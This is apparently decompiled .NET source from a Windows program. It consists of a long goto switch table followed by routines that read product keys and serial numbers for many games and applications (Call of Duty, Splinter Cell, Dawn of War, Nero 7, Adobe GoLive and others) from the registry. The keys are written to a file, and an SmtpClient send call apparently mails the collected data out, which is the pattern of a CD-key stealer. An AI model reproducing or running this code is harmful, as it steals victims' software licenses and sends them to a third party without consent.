						case 744:
							goto IL_30eb;
						case 745:
							goto IL_30f4;
						case 746:
							goto IL_3107;
						case 747:
							goto IL_3125;
						case 748:
							goto IL_3135;
						case 749:
							goto IL_3143;
						case 750:
							goto IL_3156;
						case 751:
							goto IL_3164;
						case 752:
							goto IL_316d;
						case 753:
							goto IL_3180;
						case 754:
							goto IL_319e;
						case 755:
							goto IL_31ae;
						case 756:
							goto IL_31bc;
						case 757:
							goto IL_31cf;
						case 758:
							goto IL_31dd;
						case 759:
							goto IL_31e6;
						case 760:
							goto IL_31f9;
						case 761:
							goto IL_3217;
						case 762:
							goto IL_3227;
						case 763:
							goto IL_3235;
						case 764:
							goto IL_3248;
						case 765:
							goto IL_3256;
						case 766:
							goto IL_325f;
						case 767:
							goto IL_3272;
						case 768:
							goto IL_3290;
						case 769:
							goto IL_32a0;
						case 770:
							goto IL_32ae;
						case 771:
							goto IL_32c1;
						case 772:
							goto IL_32cf;
						case 773:
							goto IL_32d8;
						case 774:
							goto IL_32eb;
						case 775:
							goto IL_3309;
						case 776:
							goto IL_3319;
						case 777:
							goto IL_3327;
						case 778:
							goto IL_333a;
						case 779:
							goto IL_3348;
						case 780:
							goto IL_3351;
						case 781:
							goto IL_3364;
						case 782:
							goto IL_3382;
						case 783:
							goto IL_3392;
						case 784:
							goto IL_33a0;
						case 785:
							goto IL_33b3;
						case 786:
							goto IL_33c1;
						case 787:
							goto IL_33ca;
						case 788:
							goto IL_33dd;
						case 789:
							goto IL_33fb;
						case 790:
							goto IL_340b;
						case 791:
							goto IL_3419;
						case 792:
							goto IL_342c;
						case 793:
							goto IL_343a;
						case 794:
							goto IL_3443;
						case 795:
							goto IL_3456;
						case 796:
							goto IL_3474;
						case 797:
							goto IL_3484;
						case 798:
							goto IL_3492;
						case 799:
							goto IL_34a5;
						case 800:
							goto IL_34b3;
						case 801:
							goto IL_34bc;
						case 802:
							goto IL_34cf;
						case 803:
							goto IL_34ed;
						case 804:
							goto IL_34fd;
						case 805:
							goto IL_350b;
						case 806:
							goto IL_351e;
						case 807:
							goto IL_352c;
						case 808:
							goto IL_3535;
						case 809:
							goto IL_3548;
						case 810:
							goto IL_3566;
						case 811:
							goto IL_3576;
						case 812:
							goto IL_3584;
						case 813:
							goto IL_3597;
						case 814:
							goto IL_35a5;
						case 815:
							goto IL_35ae;
						case 816:
							goto IL_35c1;
						case 817:
							goto IL_35df;
						case 818:
							goto IL_35ef;
						case 819:
							goto IL_35fd;
						case 820:
							goto IL_3610;
						case 821:
							goto IL_361e;
						case 822:
							goto IL_3627;
						case 823:
							goto IL_363a;
						case 824:
							goto IL_3658;
						case 825:
							goto IL_3668;
						case 826:
							goto IL_3676;
						case 827:
							goto IL_3689;
						case 828:
							goto IL_3697;
						case 829:
							goto IL_36a0;
						case 830:
							goto IL_36b3;
						case 831:
							goto IL_36d1;
						case 832:
							goto IL_36e1;
						case 833:
							goto IL_36ef;
						case 834:
							goto IL_3702;
						case 835:
							goto IL_3710;
						case 836:
							goto IL_3719;
						case 837:
							goto IL_372c;
						case 838:
							goto IL_374a;
						case 839:
							goto IL_375a;
						case 840:
							goto IL_3768;
						case 841:
							goto IL_377b;
						case 842:
							goto IL_3789;
						case 843:
							goto IL_3792;
						case 844:
							goto IL_37a5;
						case 845:
							goto IL_37c3;
						case 846:
							goto IL_37d3;
						case 847:
							goto IL_37e1;
						case 848:
							goto IL_37f4;
						case 849:
							goto IL_3802;
						case 850:
							goto IL_380b;
						case 851:
							goto IL_381e;
						case 852:
							goto IL_383c;
						case 853:
							goto IL_384c;
						case 854:
							goto IL_385a;
						case 855:
							goto IL_386d;
						case 856:
							goto IL_387b;
						case 857:
							goto IL_3884;
						case 858:
							goto IL_3897;
						case 859:
							goto IL_38b5;
						case 860:
							goto IL_38c5;
						case 861:
							goto IL_38d3;
						case 862:
							goto IL_38e6;
						case 863:
							goto IL_38f4;
						case 864:
							goto IL_38fd;
						case 865:
							goto IL_3910;
						case 866:
							goto IL_392e;
						case 867:
							goto IL_393e;
						case 868:
							goto IL_394c;
						case 869:
							goto IL_395f;
						case 870:
							goto IL_396d;
						case 871:
							goto IL_3976;
						case 872:
							goto IL_3989;
						case 873:
							goto IL_39a7;
						case 874:
							goto IL_39b7;
						case 875:
							goto IL_39c5;
						case 876:
							goto IL_39d8;
						case 877:
							goto IL_39e6;
						case 878:
							goto IL_39ef;
						case 879:
							goto IL_3a02;
						case 880:
							goto IL_3a20;
						case 881:
							goto IL_3a30;
						case 882:
							goto IL_3a3e;
						case 883:
							goto IL_3a51;
						case 884:
							goto IL_3a5f;
						case 885:
							goto IL_3a68;
						case 886:
							goto IL_3a7b;
						case 887:
							goto IL_3a99;
						case 888:
							goto IL_3aa9;
						case 889:
							goto IL_3ab7;
						case 890:
							goto IL_3aca;
						case 891:
							goto IL_3ad8;
						case 892:
							goto IL_3ae4;
						case 893:
							goto IL_3af7;
						case 894:
							goto IL_3b15;
						case 895:
							goto IL_3b25;
						case 896:
							goto IL_3b33;
						case 897:
							goto IL_3b46;
						case 898:
							goto IL_3b54;
						case 899:
							goto IL_3b60;
						case 900:
							goto IL_3b73;
						case 901:
							goto IL_3b91;
						case 902:
							goto IL_3ba1;
						case 903:
							goto IL_3baf;
						case 904:
							goto IL_3bc2;
						case 905:
							goto IL_3bd0;
						case 906:
							goto IL_3bdc;
						case 907:
							goto IL_3bef;
						case 908:
							goto IL_3c0d;
						case 909:
							goto IL_3c1d;
						case 910:
							goto IL_3c2b;
						case 911:
							goto IL_3c3e;
						case 912:
							goto IL_3c4c;
						case 913:
							goto IL_3c58;
						case 914:
							goto IL_3c6b;
						case 915:
							goto IL_3c89;
						case 916:
							goto IL_3c99;
						case 917:
							goto IL_3ca7;
						case 918:
							goto IL_3cba;
						case 919:
							goto IL_3cc8;
						case 920:
							goto IL_3cd4;
						case 921:
							goto IL_3ce7;
						case 922:
							goto IL_3d05;
						case 923:
							goto IL_3d15;
						case 924:
							goto IL_3d23;
						case 925:
							goto IL_3d36;
						case 926:
							goto IL_3d44;
						case 927:
							goto IL_3d50;
						case 928:
							goto IL_3d63;
						case 929:
							goto IL_3d81;
						case 930:
							goto IL_3d91;
						case 931:
							goto IL_3d9f;
						case 932:
							goto IL_3db2;
						case 933:
							goto IL_3dc0;
						case 934:
							goto IL_3dcc;
						case 935:
							goto IL_3ddf;
						case 936:
							goto IL_3dfd;
						case 937:
							goto IL_3e0d;
						case 938:
							goto IL_3e1b;
						case 939:
							goto IL_3e2e;
						case 940:
							goto IL_3e3c;
						case 941:
							goto IL_3e48;
						case 942:
							goto IL_3e5b;
						case 943:
							goto IL_3e79;
						case 944:
							goto IL_3e89;
						case 945:
							goto IL_3e97;
						case 946:
							goto IL_3eaa;
						case 947:
							goto IL_3eb8;
						case 948:
							goto IL_3ec4;
						case 949:
							goto IL_3ed7;
						case 950:
							goto IL_3ef5;
						case 951:
							goto IL_3f05;
						case 952:
							goto IL_3f13;
						case 953:
							goto IL_3f26;
						case 954:
							goto IL_3f34;
						case 955:
							goto IL_3f40;
						case 956:
							goto IL_3f53;
						case 957:
							goto IL_3f71;
						case 958:
							goto IL_3f81;
						case 959:
							goto IL_3f8f;
						case 960:
							goto IL_3fa2;
						case 961:
							goto IL_3fb0;
						case 962:
							goto IL_3fbc;
						case 963:
							goto IL_3fcf;
						case 964:
							goto IL_3fed;
						case 965:
							goto IL_3ffd;
						case 966:
							goto IL_400b;
						case 967:
							goto IL_401e;
						case 968:
							goto IL_402c;
						case 969:
							goto IL_4038;
						case 970:
							goto IL_404b;
						case 971:
							goto IL_4069;
						case 972:
							goto IL_4079;
						case 973:
							goto IL_4087;
						case 974:
							goto IL_409a;
						case 975:
							goto IL_40a8;
						case 976:
							goto IL_40b4;
						case 977:
							goto IL_40c7;
						case 978:
							goto IL_40e5;
						case 979:
							goto IL_40f5;
						case 980:
							goto IL_4103;
						case 981:
							goto IL_4116;
						case 982:
							goto IL_4124;
						case 983:
							goto IL_4130;
						case 984:
							goto IL_4143;
						case 985:
							goto IL_4161;
						case 986:
							goto IL_4171;
						case 987:
							goto IL_417f;
						case 988:
							goto IL_4192;
						case 989:
							goto IL_41a0;
						case 990:
							goto IL_41ac;
						case 991:
							goto IL_41bf;
						case 992:
							goto IL_41dd;
						case 993:
							goto IL_41ed;
						case 994:
							goto IL_41fb;
						case 995:
							goto IL_420e;
						case 996:
							goto IL_421c;
						case 997:
							goto IL_4228;
						case 998:
							goto IL_423b;
						case 999:
							goto IL_4259;
						case 1000:
							goto IL_4269;
						case 1001:
							goto IL_4277;
						case 1002:
							goto IL_428a;
						case 1003:
							goto IL_4298;
						case 1004:
							goto IL_42a4;
						case 1005:
							goto IL_42b7;
						case 1006:
							goto IL_42d5;
						case 1007:
							goto IL_42e5;
						case 1008:
							goto IL_42f3;
						case 1009:
							goto IL_4306;
						case 1010:
							goto IL_4314;
						case 1011:
							goto IL_4320;
						case 1012:
							goto IL_4333;
						case 1013:
							goto IL_4351;
						case 1014:
							goto IL_4361;
						case 1015:
							goto IL_436f;
						case 1016:
							goto IL_4382;
						case 1017:
							goto IL_4390;
						case 1018:
							goto IL_439c;
						case 1019:
							goto IL_43af;
						case 1020:
							goto IL_43cd;
						case 1021:
							goto IL_43dd;
						case 1022:
							goto IL_43eb;
						case 1023:
							goto IL_43fe;
						case 1024:
							goto IL_440c;
						case 1025:
							goto IL_4418;
						case 1026:
							goto IL_442b;
						case 1027:
							goto IL_4449;
						case 1028:
							goto IL_4459;
						case 1029:
							goto IL_4467;
						case 1030:
							goto IL_447a;
						case 1031:
							goto IL_4488;
						case 1032:
							goto IL_4494;
						case 1033:
							goto IL_44a7;
						case 1034:
							goto IL_44c5;
						case 1035:
							goto IL_44d5;
						case 1036:
							goto IL_44e3;
						case 1037:
							goto IL_44f6;
						case 1038:
							goto IL_4504;
						case 1039:
							goto IL_4510;
						case 1040:
							goto IL_4523;
						case 1041:
							goto IL_4541;
						case 1042:
							goto IL_4551;
						case 1043:
							goto IL_455f;
						case 1044:
							goto IL_4572;
						case 1045:
							goto IL_4580;
						case 1046:
							goto IL_458c;
						case 1047:
							goto IL_459f;
						case 1048:
							goto IL_45bd;
						case 1049:
							goto IL_45cd;
						case 1050:
							goto IL_45db;
						case 1051:
							goto IL_45ee;
						case 1052:
							goto IL_45fc;
						case 1053:
							goto IL_4608;
						case 1054:
							goto IL_461b;
						case 1055:
							goto IL_4639;
						case 1056:
							goto IL_4649;
						case 1057:
							goto IL_4657;
						case 1058:
							goto IL_466a;
						case 1059:
							goto IL_4678;
						case 1060:
							goto IL_4684;
						case 1061:
							goto IL_4697;
						case 1062:
							goto IL_46b5;
						case 1063:
							goto IL_46c5;
						case 1064:
							goto IL_46d3;
						case 1065:
							goto IL_46e6;
						case 1066:
							goto IL_46f4;
						case 1067:
							goto IL_4700;
						case 1068:
							goto IL_4713;
						case 1069:
							goto IL_4731;
						case 1070:
							goto IL_4741;
						case 1071:
							goto IL_474f;
						case 1072:
							goto IL_4762;
						case 1073:
							goto IL_4770;
						case 1074:
							goto IL_477c;
						case 1075:
							goto IL_478f;
						case 1076:
							goto IL_47ad;
						case 1077:
							goto IL_47bd;
						case 1078:
							goto IL_47cb;
						case 1079:
							goto IL_47de;
						case 1080:
							goto IL_47ec;
						case 1081:
							goto IL_47f8;
						case 1082:
							goto IL_480b;
						case 1083:
							goto IL_4829;
						case 1084:
							goto IL_4839;
						case 1085:
							goto IL_4847;
						case 1086:
							goto IL_485a;
						case 1087:
							goto IL_4868;
						case 1088:
							goto IL_4874;
						case 1089:
							goto IL_4887;
						case 1090:
							goto IL_48a5;
						case 1091:
							goto IL_48b5;
						case 1092:
							goto IL_48c3;
						case 1093:
							goto IL_48d6;
						case 1094:
							goto IL_48e4;
						case 1095:
							goto IL_48f0;
						case 1096:
							goto IL_4903;
						case 1097:
							goto IL_4921;
						case 1098:
							goto IL_4931;
						case 1099:
							goto IL_493f;
						case 1100:
							goto IL_4952;
						case 1101:
							goto IL_4960;
						case 1102:
							goto IL_496c;
						case 1103:
							goto IL_497f;
						case 1104:
							goto IL_499d;
						case 1105:
							goto IL_49ad;
						case 1106:
							goto IL_49bb;
						case 1107:
							goto IL_49ce;
						case 1108:
							goto IL_49dc;
						case 1109:
							goto IL_49e8;
						case 1110:
							goto IL_49fb;
						case 1111:
							goto IL_4a19;
						case 1112:
							goto IL_4a29;
						case 1113:
							goto IL_4a37;
						case 1114:
							goto IL_4a4a;
						case 1115:
							goto IL_4a58;
						case 1116:
							goto IL_4a64;
						case 1117:
							goto IL_4a77;
						case 1118:
							goto IL_4a95;
						case 1119:
							goto IL_4aa5;
						case 1120:
							goto IL_4ab3;
						case 1121:
							goto IL_4ac6;
						case 1122:
							goto IL_4ad4;
						case 1123:
							goto IL_4ae0;
						case 1124:
							goto IL_4af3;
						case 1125:
							goto IL_4b11;
						case 1126:
							goto IL_4b21;
						case 1127:
							goto IL_4b2f;
						case 1128:
							goto IL_4b42;
						case 1129:
							goto IL_4b50;
						case 1130:
							goto IL_4b5c;
						case 1131:
							goto IL_4b6f;
						case 1132:
							goto IL_4b8d;
						case 1133:
							goto IL_4b9d;
						case 1134:
							goto IL_4bab;
						case 1135:
							goto IL_4bbe;
						case 1136:
							goto IL_4bcc;
						case 1137:
							goto IL_4bd8;
						case 1138:
							goto IL_4beb;
						case 1139:
							goto IL_4c09;
						case 1140:
							goto IL_4c19;
						case 1141:
							goto IL_4c27;
						case 1142:
							goto IL_4c3a;
						case 1143:
							goto IL_4c48;
						case 1144:
							goto IL_4c54;
						case 1145:
							goto IL_4c67;
						case 1146:
							goto IL_4c85;
						case 1147:
							goto IL_4c95;
						case 1148:
							goto IL_4ca3;
						case 1149:
							goto IL_4cb6;
						case 1150:
							goto IL_4cc4;
						case 1151:
							goto IL_4cd0;
						case 1152:
							goto IL_4ce3;
						case 1153:
							goto IL_4d01;
						case 1154:
							goto IL_4d11;
						case 1155:
							goto IL_4d1f;
						case 1156:
							goto IL_4d32;
						case 1157:
							goto IL_4d40;
						case 1158:
							goto IL_4d4c;
						case 1159:
							goto IL_4d5f;
						case 1160:
							goto IL_4d7d;
						case 1161:
							goto IL_4d8d;
						case 1162:
							goto IL_4d9b;
						case 1163:
							goto IL_4dae;
						case 1164:
							goto IL_4dbc;
						case 1165:
							goto IL_4dc8;
						case 1166:
							goto IL_4ddb;
						case 1167:
							goto IL_4df9;
						case 1168:
							goto IL_4e09;
						case 1169:
							goto IL_4e17;
						case 1170:
							goto IL_4e2a;
						case 1171:
							goto IL_4e38;
						case 1172:
							goto IL_4e44;
						case 1173:
							goto IL_4e57;
						case 1174:
							goto IL_4e75;
						case 1175:
							goto IL_4e85;
						case 1176:
							goto IL_4e93;
						case 1177:
							goto IL_4ea6;
						case 1178:
							goto IL_4eb4;
						case 1179:
							goto IL_4ec0;
						case 1180:
							goto IL_4ed3;
						case 1181:
							goto IL_4ef1;
						case 1182:
							goto IL_4f01;
						case 1183:
							goto IL_4f0f;
						case 1184:
							goto IL_4f22;
						case 1185:
							goto IL_4f30;
						case 1186:
							goto IL_4f3c;
						case 1187:
							goto IL_4f4f;
						case 1188:
							goto IL_4f6d;
						case 1189:
							goto IL_4f7d;
						case 1190:
							goto IL_4f8b;
						case 1191:
							goto IL_4f9e;
						case 1192:
							goto IL_4fac;
						case 1193:
							goto IL_4fb8;
						case 1194:
							goto IL_4fcb;
						case 1195:
							goto IL_4fe9;
						case 1196:
							goto IL_4ff9;
						case 1197:
							goto IL_5007;
						case 1198:
							goto IL_501a;
						case 1199:
							goto IL_5028;
						case 1200:
							goto IL_5034;
						case 1201:
							goto IL_5047;
						case 1202:
							goto IL_5065;
						case 1203:
							goto IL_5075;
						case 1204:
							goto IL_5083;
						case 1205:
							goto IL_5096;
						case 1206:
							goto IL_50a4;
						case 1207:
							goto IL_50b0;
						case 1208:
							goto IL_50c3;
						case 1209:
							goto IL_50e1;
						case 1210:
							goto IL_50f1;
						case 1211:
							goto IL_50ff;
						case 1212:
							goto IL_5112;
						case 1213:
							goto IL_5120;
						case 1214:
							goto IL_512c;
						case 1215:
							goto IL_513f;
						case 1216:
							goto IL_515d;
						case 1217:
							goto IL_516d;
						case 1218:
							goto IL_517b;
						case 1219:
							goto IL_518e;
						case 1220:
							goto IL_519c;
						case 1221:
							goto IL_51a8;
						case 1222:
							goto IL_51bb;
						case 1223:
							goto IL_51d9;
						case 1224:
							goto IL_51e9;
						case 1225:
							goto IL_51f7;
						case 1226:
							goto IL_520a;
						case 1227:
							goto IL_5218;
						case 1228:
							goto IL_5224;
						case 1229:
							goto IL_5237;
						case 1230:
							goto IL_5255;
						case 1231:
							goto IL_5265;
						case 1232:
							goto IL_5273;
						case 1233:
							goto IL_5286;
						case 1234:
							goto IL_5294;
						case 1235:
							goto IL_52a0;
						case 1236:
							goto IL_52b3;
						case 1237:
							goto IL_52d1;
						case 1238:
							goto IL_52e1;
						case 1239:
							goto IL_52ef;
						case 1240:
							goto IL_5302;
						case 1241:
							goto IL_5310;
						case 1242:
							goto IL_531c;
						case 1243:
							goto IL_532f;
						case 1244:
							goto IL_534d;
						case 1245:
							goto IL_535d;
						case 1246:
							goto IL_536b;
						case 1247:
							goto IL_537e;
						case 1248:
							goto IL_538c;
						case 1249:
							goto IL_5398;
						case 1250:
							goto IL_53ab;
						case 1251:
							goto IL_53c9;
						case 1252:
							goto IL_53d9;
						case 1253:
							goto IL_53e7;
						case 1254:
							goto IL_53fa;
						case 1255:
							goto IL_5408;
						case 1256:
							goto IL_5414;
						case 1257:
							goto IL_5427;
						case 1258:
							goto IL_5445;
						case 1259:
							goto IL_5455;
						case 1260:
							goto IL_5463;
						case 1261:
							goto IL_5476;
						case 1262:
							goto IL_5484;
						case 1263:
							goto IL_5492;
						case 1264:
							goto IL_54a0;
						case 1265:
							goto IL_54c1;
						case 1266:
							goto IL_54de;
						case 1267:
							goto IL_54eb;
						case 1268:
							goto IL_550c;
						case 1269:
							goto IL_5533;
						case 1270:
							goto IL_555a;
						case 1271:
							goto IL_5572;
						case 1272:
							goto IL_558b;
						case 1273:
							goto IL_55a9;
						case 1274:
							goto IL_55b8;
						case 1275:
							goto IL_55f5;
						case 1276:
							goto IL_5604;
						case 1277:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 1278:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_5604:
					num = 1276;
					((TextBoxBase)TextBox4).Clear();
					break;
					IL_55f5:
					num = 1275;
					smtpClient.Send(mailMessage);
					goto IL_5604;
					IL_001f:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0028;
					IL_0028:
					num = 3;
					streamWriter.WriteLine("Splinter Cell Pandora Tomorrow");
					goto IL_0037;
					IL_0037:
					num = 4;
					value = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Pandora Tomorrow", "CDKey", null));
					goto IL_0050;
					IL_0050:
					num = 5;
					streamWriter.WriteLine(value);
					goto IL_005b;
					IL_005b:
					num = 6;
					streamWriter.Flush();
					goto IL_0065;
					IL_0065:
					num = 7;
					streamWriter.WriteLine("");
					goto IL_0074;
					IL_0074:
					num = 8;
					streamWriter.Flush();
					goto IL_007e;
					IL_007e:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_0087;
					IL_0087:
					num = 10;
					streamWriter.WriteLine("Splinter Cell Chaos Theory");
					goto IL_0097;
					IL_0097:
					num = 11;
					value2 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory\\Keys", "DiscKey_SCCT", null));
					goto IL_00b1;
					IL_00b1:
					num = 12;
					streamWriter.WriteLine(value2);
					goto IL_00bd;
					IL_00bd:
					num = 13;
					streamWriter.Flush();
					goto IL_00c8;
					IL_00c8:
					num = 14;
					streamWriter.WriteLine("");
					goto IL_00d8;
					IL_00d8:
					num = 15;
					streamWriter.Flush();
					goto IL_00e3;
					IL_00e3:
					ProjectData.ClearProjectError();
					num3 = -4;
					goto IL_00ec;
					IL_00ec:
					num = 17;
					streamWriter.WriteLine("Call of Duty");
					goto IL_00fc;
					IL_00fc:
					num = 18;
					value3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty", "codkey", null));
					goto IL_0117;
					IL_0117:
					num = 19;
					streamWriter.WriteLine(value3);
					goto IL_0124;
					IL_0124:
					num = 20;
					streamWriter.Flush();
					goto IL_012f;
					IL_012f:
					num = 21;
					streamWriter.WriteLine("");
					goto IL_013f;
					IL_013f:
					num = 22;
					streamWriter.Flush();
					goto IL_014a;
					IL_014a:
					ProjectData.ClearProjectError();
					num3 = -5;
					goto IL_0153;
					IL_0153:
					num = 24;
					streamWriter.WriteLine("Call of Duty United Offensive");
					goto IL_0163;
					IL_0163:
					num = 25;
					value4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty United Offensive", "key", null));
					goto IL_017e;
					IL_017e:
					num = 26;
					streamWriter.WriteLine(value4);
					goto IL_018b;
					IL_018b:
					num = 27;
					streamWriter.Flush();
					goto IL_0196;
					IL_0196:
					num = 28;
					streamWriter.WriteLine("");
					goto IL_01a6;
					IL_01a6:
					num = 29;
					streamWriter.Flush();
					goto IL_01b1;
					IL_01b1:
					ProjectData.ClearProjectError();
					num3 = -6;
					goto IL_01ba;
					IL_01ba:
					num = 31;
					streamWriter.WriteLine("Call of Duty 2");
					goto IL_01ca;
					IL_01ca:
					num = 32;
					value5 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 2", "codkey", null));
					goto IL_01e5;
					IL_01e5:
					num = 33;
					streamWriter.WriteLine(value5);
					goto IL_01f2;
					IL_01f2:
					num = 34;
					streamWriter.Flush();
					goto IL_01fd;
					IL_01fd:
					num = 35;
					streamWriter.WriteLine("");
					goto IL_020d;
					IL_020d:
					num = 36;
					streamWriter.Flush();
					goto IL_0218;
					IL_0218:
					ProjectData.ClearProjectError();
					num3 = -7;
					goto IL_0221;
					IL_0221:
					num = 38;
					streamWriter.WriteLine("Call of Duty 4");
					goto IL_0231;
					IL_0231:
					num = 39;
					value6 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 4", "codkey", null));
					goto IL_024c;
					IL_024c:
					num = 40;
					streamWriter.WriteLine(value6);
					goto IL_0259;
					IL_0259:
					num = 41;
					streamWriter.Flush();
					goto IL_0264;
					IL_0264:
					num = 42;
					streamWriter.WriteLine("");
					goto IL_0274;
					IL_0274:
					num = 43;
					streamWriter.Flush();
					goto IL_027f;
					IL_027f:
					ProjectData.ClearProjectError();
					num3 = -8;
					goto IL_0288;
					IL_0288:
					num = 45;
					streamWriter.WriteLine("Call of Duty WAW");
					goto IL_0298;
					IL_0298:
					num = 46;
					value7 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty WAW", "codkey", null));
					goto IL_02b3;
					IL_02b3:
					num = 47;
					streamWriter.WriteLine(value7);
					goto IL_02c0;
					IL_02c0:
					num = 48;
					streamWriter.Flush();
					goto IL_02cb;
					IL_02cb:
					num = 49;
					streamWriter.WriteLine("");
					goto IL_02db;
					IL_02db:
					num = 50;
					streamWriter.Flush();
					goto IL_02e6;
					IL_02e6:
					ProjectData.ClearProjectError();
					num3 = -9;
					goto IL_02ef;
					IL_02ef:
					num = 52;
					streamWriter.WriteLine("Dawn of War");
					goto IL_02ff;
					IL_02ff:
					num = 53;
					value8 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War", "CDKEY", null));
					goto IL_031a;
					IL_031a:
					num = 54;
					streamWriter.WriteLine(value8);
					goto IL_0327;
					IL_0327:
					num = 55;
					streamWriter.Flush();
					goto IL_0332;
					IL_0332:
					num = 56;
					streamWriter.WriteLine("");
					goto IL_0342;
					IL_0342:
					num = 57;
					streamWriter.Flush();
					goto IL_034d;
					IL_034d:
					ProjectData.ClearProjectError();
					num3 = -10;
					goto IL_0356;
					IL_0356:
					num = 59;
					streamWriter.WriteLine("Dawn of War - Dark Crusade");
					goto IL_0366;
					IL_0366:
					num = 60;
					value9 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "CDKEY", null));
					goto IL_0381;
					IL_0381:
					num = 61;
					streamWriter.WriteLine(value9);
					goto IL_038e;
					IL_038e:
					num = 62;
					streamWriter.Flush();
					goto IL_0399;
					IL_0399:
					num = 63;
					streamWriter.WriteLine("");
					goto IL_03a9;
					IL_03a9:
					num = 64;
					streamWriter.Flush();
					goto IL_03b4;
					IL_03b4:
					ProjectData.ClearProjectError();
					num3 = -11;
					goto IL_03bd;
					IL_03bd:
					num = 66;
					streamWriter.WriteLine("Dawn of War - Dark Crusade");
					goto IL_03cd;
					IL_03cd:
					num = 67;
					value10 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "W40KCDKEY", null));
					goto IL_03e8;
					IL_03e8:
					num = 68;
					streamWriter.WriteLine(value10);
					goto IL_03f5;
					IL_03f5:
					num = 69;
					streamWriter.Flush();
					goto IL_0400;
					IL_0400:
					num = 70;
					streamWriter.WriteLine("");
					goto IL_0410;
					IL_0410:
					num = 71;
					streamWriter.Flush();
					goto IL_041b;
					IL_041b:
					ProjectData.ClearProjectError();
					num3 = -12;
					goto IL_0424;
					IL_0424:
					num = 73;
					streamWriter.WriteLine("Dawn of War - Dark Crusade");
					goto IL_0434;
					IL_0434:
					num = 74;
					value11 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "WXPCDKEY", null));
					goto IL_044f;
					IL_044f:
					num = 75;
					streamWriter.WriteLine(value11);
					goto IL_045c;
					IL_045c:
					num = 76;
					streamWriter.Flush();
					goto IL_0467;
					IL_0467:
					num = 77;
					streamWriter.WriteLine("");
					goto IL_0477;
					IL_0477:
					num = 78;
					streamWriter.Flush();
					goto IL_0482;
					IL_0482:
					ProjectData.ClearProjectError();
					num3 = -13;
					goto IL_048b;
					IL_048b:
					num = 80;
					streamWriter.WriteLine("Medieval II Total War");
					goto IL_049b;
					IL_049b:
					num = 81;
					value12 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\SEGA\\Medieval II Total War", "CDKey", null));
					goto IL_04b6;
					IL_04b6:
					num = 82;
					streamWriter.WriteLine(value12);
					goto IL_04c3;
					IL_04c3:
					num = 83;
					streamWriter.Flush();
					goto IL_04ce;
					IL_04ce:
					num = 84;
					streamWriter.WriteLine("");
					goto IL_04de;
					IL_04de:
					num = 85;
					streamWriter.Flush();
					goto IL_04e9;
					IL_04e9:
					ProjectData.ClearProjectError();
					num3 = -14;
					goto IL_04f2;
					IL_04f2:
					num = 87;
					streamWriter.WriteLine("Adobe Goolive");
					goto IL_0502;
					IL_0502:
					num = 88;
					value13 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Golive\\5.0\\Registration", "SERIAL", null));
					goto IL_051d;
					IL_051d:
					num = 89;
					streamWriter.WriteLine(value13);
					goto IL_052a;
					IL_052a:
					num = 90;
					streamWriter.Flush();
					goto IL_0535;
					IL_0535:
					num = 91;
					streamWriter.WriteLine("");
					goto IL_0545;
					IL_0545:
					num = 92;
					streamWriter.Flush();
					goto IL_0550;
					IL_0550:
					ProjectData.ClearProjectError();
					num3 = -15;
					goto IL_0559;
					IL_0559:
					num = 94;
					streamWriter.WriteLine("Nero 7");
					goto IL_0569;
					IL_0569:
					num = 95;
					value14 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ahead\\Installation\\BAK\\Nero 7\\Info", "Serial7_1190555485", null));
					goto IL_0584;
					IL_0584:
					num = 96;
					streamWriter.WriteLine(value14);
					goto IL_0591;
					IL_0591:
					num = 97;
					streamWriter.Flush();
					goto IL_059c;
					IL_059c:
					num = 98;
					streamWriter.WriteLine("");
					goto IL_05ac;
					IL_05ac:
					num = 99;
					streamWriter.Flush();
					goto IL_05b7;
					IL_05b7:
					ProjectData.ClearProjectError();
					num3 = -16;
					goto IL_05c0;
					IL_05c0:
					num = 101;
					streamWriter.WriteLine("ACDSystems PicAView");
					goto IL_05d0;
					IL_05d0:
					num = 102;
					value15 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACD Systems\\PicaView", "LicenseNumber", null));
					goto IL_05eb;
					IL_05eb:
					num = 103;
					streamWriter.WriteLine(value15);
					goto IL_05f8;
					IL_05f8:
					num = 104;
					streamWriter.Flush();
					goto IL_0603;
					IL_0603:
					num = 105;
					streamWriter.WriteLine("");
					goto IL_0613;
					IL_0613:
					num = 106;
					streamWriter.Flush();
					goto IL_061e;
					IL_061e:
					ProjectData.ClearProjectError();
					num3 = -17;
					goto IL_0627;
					IL_0627:
					num = 108;
					streamWriter.WriteLine("Act of War");
					goto IL_0637;
					IL_0637:
					num = 109;
					value16 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Eugen Systems\\ActOfWa", "RegNumber", null));
					goto IL_0652;
					IL_0652:
					num = 110;
					streamWriter.WriteLine(value16);
					goto IL_065f;
					IL_065f:
					num = 111;
					streamWriter.Flush();
					goto IL_066a;
					IL_066a:
					num = 112;
